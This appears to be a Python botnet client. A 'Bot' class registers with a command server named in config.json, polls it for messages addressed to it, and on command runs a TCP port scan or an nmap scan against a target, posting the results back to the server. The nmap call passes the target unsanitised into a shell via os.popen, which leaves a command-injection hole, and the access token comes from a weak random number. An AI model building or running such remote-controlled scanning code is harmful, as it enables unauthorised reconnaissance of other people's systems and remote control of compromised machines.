import hashlib
import random
import os
import requests 
import json
from socket import *

class Bot:
	command_server_url = ""
	server_api_urls = ""
	botname = ""
	access_token = ""
	access_to_message_api = bool


	def __init__(self):
		with open('config.json') as f:
			run_config = json.load(f)

		self.command_server_url = run_config["server_url"]
		self.server_api_urls = run_config["server_api_urls"].copy()

		if not run_config["access_token"]:
			self.access_token = self.generate_access_token()
		else:
			self.access_token = run_config["access_token"]

		if not run_config["botname"] or not run_config["access_to_message_api"]:
			
			self.access_to_message_api, self.botname = self.registration_request()
		else:
			self.access_to_message_api = run_config["access_to_message_api"]
			self.botname = run_config["botname"]

		run_config["botname"] = self.botname
		run_config["access_token"] = self.access_token
		run_config["access_to_message_api"] = self.access_to_message_api

		with open('config.json', 'w') as f:
			json.dump(run_config, f)

	def generate_access_token(self):
		access_token = hashlib.md5(str(random.randint(0,999999)).encode())
		return access_token.hexdigest()


	def registration_request(self):
		registration_url = self.command_server_url + self.server_api_urls[0]
		message_api_url = self.command_server_url + self.server_api_urls[1]
		r = requests.post(registration_url, data={"access_token":self.access_token})
		
		registration_ack = False
		while not registration_ack:
			r = requests.get(message_api_url, cookies={"access_token":self.access_token})
			r = r.json()
			if r["access_to_message_api"]:
				registration_ack = True
		return (r["access_to_message_api"], r["botname"])

	def wait_command(self):
		while True:
			last_message_url = self.command_server_url + self.server_api_urls[3]
			r = requests.get(last_message_url, cookies={"access_token":self.access_token})
			r = r.json()
			if r["last_message"]["receiver"] == self.botname:
				return (r["last_message"]["sender"],r["last_message"]["content"])

	def echo(self, echo_request, receiver):
		send_message_url = self.command_server_url + self.server_api_urls[2]
		data = {"receiver":receiver, "content":echo_request}
		requests.post(send_message_url, cookies={"access_token":self.access_token}, data=data)

	def portscan(self,target,receiver):
		send_message_url = self.command_server_url + self.server_api_urls[2]
		print("portscan "+target)
		report = ""
		for i in range(0,200):
			s = socket(AF_INET, SOCK_STREAM)
			conn = s.connect_ex((target, i))
			if conn == 0:
				print("{} open".format(i))
				report += "{} open\n".format(i)
			s.close()
		print("End portscan")
		data = {"receiver":receiver, "content":report}
		requests.post(send_message_url, cookies={"access_token":self.access_token}, data=data)

	def nmap(self, target, receiver):
		report = os.popen("nmap {}".format(target)).read()
		self.echo(report, receiver)


